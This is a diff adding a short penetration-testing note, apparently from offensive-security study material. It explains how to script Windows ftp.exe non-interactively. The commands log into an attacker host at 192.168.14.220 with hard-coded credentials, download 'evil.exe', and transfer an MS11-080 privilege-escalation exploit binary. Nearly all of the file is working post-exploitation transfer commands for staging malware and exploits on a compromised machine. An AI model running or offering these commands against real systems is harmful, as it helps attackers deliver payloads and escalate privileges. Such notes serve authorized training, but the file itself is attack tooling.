@@ -1,0 +1,24 @@
+the following script allows ftp.exe to use a script to execute non-interactively
+use GET PUT to to ftp sever
+######################################
+######################################
+echo open 192.168.14.220 21 > ftp.txt
+echo offsec>> ftp.txt
+echo lol>> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+#######################################
+#########################################
+put to ftp
+##########################################
+##########################################
+echo open 192.168.14.220 21 > ftp.txt
+echo offsec>> ftp.txt
+echo lol>> ftp.txt
+echo bin >> ftp.txt
+echo PUT ms11-080-xp-2003-32-64.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
